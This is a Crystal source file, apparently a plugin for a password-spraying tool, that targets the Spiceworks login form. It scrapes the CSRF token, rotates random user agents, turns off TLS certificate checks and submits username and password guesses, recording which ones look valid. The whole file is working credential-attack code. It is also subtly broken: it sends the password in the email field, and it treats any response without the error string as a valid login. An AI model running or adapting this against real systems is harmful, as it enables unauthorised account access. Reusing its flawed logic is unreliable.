require "http/client"
require "xml"
require "crystagiri"

class Spiceworks < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        lockedout = false
        valid = false
        mfa = false

        # 
        # enter your auth check here and make sure 
        #
        url = URI.parse @target




        # get cookies to use
        # context = OpenSSL::SSL::Context::Client.insecure
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE

        client = HTTP::Client.new(url, tls: context)
        

        resp = client.get(url.path)

        header = HTTP::Headers{ # headers for post request 
            # "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))], # use a random useragent from the list available
            # "Host" => "#{url.host}",
            "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded",
            "Origin" => "https://#{url.host}",
            "Referer" => "https://#{url.host}#{url.path}",
            "Cookie" => "spiceworks_session=#{resp.cookies["spiceworks_session"].value}",
            "Sec-Fetch-Dest" => "document",
            "Sec-Fetch-Mode" => "navigate",
            "Sec-Fetch-Site" => "same-origin",
            "Sec-Fetch-User" => "?1"
        }
        authenticity_token = ""

        cg = Crystagiri::HTML.new(resp.body)
        n = cg.at_css("input")
        if n 
            authenticity_token = URI.encode_www_form(n.node.attributes["value"].content)
        else 
            raise "bad http parse error"
        end
        


        


        pro_user_email_ =  URI.encode_www_form(username)
        pro_user_password_ =  URI.encode_www_form(password)
        pro_user_remember_me_ = 0

        form = "authenticity_token=#{authenticity_token}&_pickaxe=%E2%B8%95&pro_user%5Bemail%5D=#{pro_user_password_}&pro_user%5Bpassword%5D=#{pro_user_password_}&pro_user%5Bremember_me%5D=0"

        page = client.post(url.path, headers: header, form: form)


        #puts page.status
        #puts  page.headers
        if !page.body.includes? "Invalid email or password."
            # puts "Returned a 405"
            valid = true 
        end
        


       

        #
        # end of your auth check here
        # 
        
        return [username, password, valid, lockedout, mfa]
    end
end